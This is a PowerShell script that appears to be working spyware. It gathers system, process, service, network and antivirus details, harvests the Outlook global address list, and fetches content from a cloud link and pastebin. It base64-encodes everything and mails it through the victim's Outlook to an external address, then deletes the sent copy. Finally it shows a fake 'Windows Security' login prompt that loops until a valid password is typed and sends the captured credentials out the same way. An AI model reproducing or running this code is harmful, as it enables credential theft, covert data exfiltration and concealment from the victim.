function Invoke-LoginPrompt{
	$cred = $Host.ui.PromptForCredential('Windows Security', 'Please enter user credentials', $env:userdomain+'\'+$env:username,'');
	$username = $env:username;$domain = $env:userdomain;$full = $domain + '\' + $username;$password = $cred.GetNetworkCredential().password;
	Add-Type -assemblyname System.DirectoryServices.AccountManagement;
	$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine);
	while($DS.ValidateCredentials($full, $password) -ne $True){
		$cred = $Host.ui.PromptForCredential('Windows Security', 'Invalid Credentials, Please try again', $env:userdomain+'\'+$env:username,'');
		$username = $env:username;
		$domain = $env:userdomain;
		$full = $domain + '\' + $username;
		$password = $cred.GetNetworkCredential().password;
		Add-Type -assemblyname System.DirectoryServices.AccountManagement;
		$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine);
		$DS.ValidateCredentials($full, $password) | out-null;
	}
	$output = $cred.GetNetworkCredential().UserName, $cred.GetNetworkCredential().Domain, $cred.GetNetworkCredential().Password;
	send_system_data_from_existing_outlook(encode($output));
}

function send_system_data_from_existing_outlook($encodedCommand,$presend="5",$postsend="5"){
	Add-Type -Assembly 'Microsoft.Office.Interop.Outlook' -PassThru;
	$Outlook = New-Object -ComObject Outlook.Application;
	$Mail = $Outlook.CreateItem(0);
	Start-Sleep $presend;
	$Mail.Recipients.Add('sigmund5102@openmailbox.org');
	$Mail.Subject='Result';
	$Mail.Body = $encodedCommand;
	$Mail.Send();
	Start-Sleep $postsend;
	$objOutlook = New-Object -ComObject Outlook.Application;
	$objNamespace = $objOutlook.GetNamespace('MAPI');
	$objFolder = $objNamespace.GetDefaultFolder(5);
	$colItems = $objFolder.Items;
	$colItems.Remove($colItems.Count);
}

function encode($output){
	return [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($output));
}

function get_contacts(){
	$outlook = New-Object -ComObject Outlook.Application;
	$item = $outlook.Session.GetGlobalAddressList().AddressEntries;
	$contacts = '';
    Foreach ($i in $item){
		$contacts +=  $i.Name +','+ $i.GetExchangeUser().MobileTelephoneNumber+','+ $i.GetExchangeUser().PrimarySmtpAddress+ ';'
	};
	return $contacts;
}

$output = [string](Get-WmiObject -Class Win32_ComputerSystem -ErrorAction SilentlyContinue | Select-Object -Property PSComputerName, SystemType, TotalPhysicalMemory, UserName, Manufacturer, HypervisorPresent);

$output += [string](Get-WmiObject -Class Win32_OperatingSystem -ErrorAction SilentlyContinue| Select-Object -Property Caption);

foreach ($i in Get-Process -ErrorAction SilentlyContinue){
	$output += $i.Name+';';
};

foreach ($i in Get-Service -ErrorAction SilentlyContinue){
	$output += $i.Name+','+$i.Status+';' 
};

foreach ($i in Get-WmiObject Win32_LogicalDisk -ErrorAction SilentlyContinue){
	$output += $i.Name+','+$i.Description+','+$i.Size+';' 
};

foreach ($i in Get-WmiObject Win32_NetworkAdapterConfiguration | Select-Object IPAddress, Description){
	$output += $i.IPAddress+','+$i.Description+';'
}

foreach ($i in get-wmiobject win32_networkadapter -filter 'netconnectionstatus = 2'){
	$output += $i.name+','+$i.MacAddress+','+$i.AdapterType+';'
}

$output += (Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct -ErrorAction SilentlyContinue).displayName;
$encodedCommand = encode($output);
Clear-Host;
$val = $null;

Try{
	$val = (Get-Process -Name Outlook -ErrorAction SilentlyContinue);
}
Catch{};

if ($val -eq $null){
	Try{
		Start-Process Outlook -ErrorAction SilentlyContinue;
	}
	Catch{
		$val = (Get-Process -Name Outlook -ErrorAction SilentlyContinue);
		if($val -eq $null){}
		else{
			send_system_data_from_existing_outlook($encodedCommand);
		}
	}
}
else{
	send_system_data_from_existing_outlook($encodedCommand);
}

Start-Sleep 2;
(New-Object System.Net.WebClient).Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
(New-Object System.Net.WebClient).Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;

$x = 'Could not be fetched';
$x = (New-Object Net.WebClient).DownloadString('https://link-to-file-on-cloudservice');
send_system_data_from_existing_outlook(encode($x));

$x = 'Could not be fetched';
$x = (New-Object Net.WebClient).DownloadString('http://pastebin.com/raw/XXXXXXXX');
send_system_data_from_existing_outlook(encode($x));


$x = get_contacts;
$y = encode -output $x;
send_system_data_from_existing_outlook -encodedCommand $y -presend "10" -postsend "10";
Start-Sleep 300;
Invoke-LoginPrompt;
